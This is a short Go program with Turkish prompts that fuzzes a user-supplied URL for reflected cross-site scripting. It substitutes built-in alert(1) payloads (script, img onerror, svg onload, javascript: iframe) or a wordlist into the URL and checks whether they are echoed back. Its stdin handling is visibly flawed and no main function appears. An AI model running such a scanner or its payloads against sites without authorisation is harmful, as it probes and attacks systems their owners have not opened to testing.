package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
)

func xss() {
	reader := bufio.NewReader(os.Stdin)
	var rawURL string
	// URL önce alınsın
	bufio.NewReader(os.Stdin).ReadString('\n')
	fmt.Print("FUZZ içeren hedef URL'yi girin (örnek: http://site.com/search?q=FUZZ): ")
	fmt.Scanln(&rawURL)

	if !strings.Contains(rawURL, "FUZZ") {
		fmt.Println("Hata: URL içinde 'FUZZ' bulunmalı.")
		return
	}

	// Wordlist sonra
	fmt.Print("Wordlist dosyasının yolunu girin (boş geçersen varsayılan kullanılacak): ")
	wordlistPath, _ := reader.ReadString('\n')
	wordlistPath = strings.TrimSpace(wordlistPath)

	var payloads []string
	if wordlistPath == "" {
		payloads = []string{
			`<script>alert(1)</script>`,
			`"><script>alert(1)</script>`,
			`<img src=x onerror=alert(1)>`,
			`<svg onload=alert(1)>`,
			`<iframe src="javascript:alert(1)"></iframe>`,
		}
	} else {
		file, err := os.Open(wordlistPath)
		if err != nil {
			fmt.Println("Wordlist açılamadı:", err)
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			payload := strings.TrimSpace(scanner.Text())
			if payload != "" {
				payloads = append(payloads, payload)
			}
		}
	}

	for _, payload := range payloads {
		testURL := strings.Replace(rawURL, "FUZZ", url.QueryEscape(payload), -1)
		testXSS(testURL, payload)
	}
}

func testXSS(testURL, payload string) {
	resp, err := http.Get(testURL)
	if err != nil {
		fmt.Println("Hata:", err)
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)

	if strings.Contains(string(body), payload) {
		fmt.Printf("[!] XSS bulundu: %s\n", testURL)
	} else {
		fmt.Printf("Bulunamadı %s\n", testURL)
	}
}
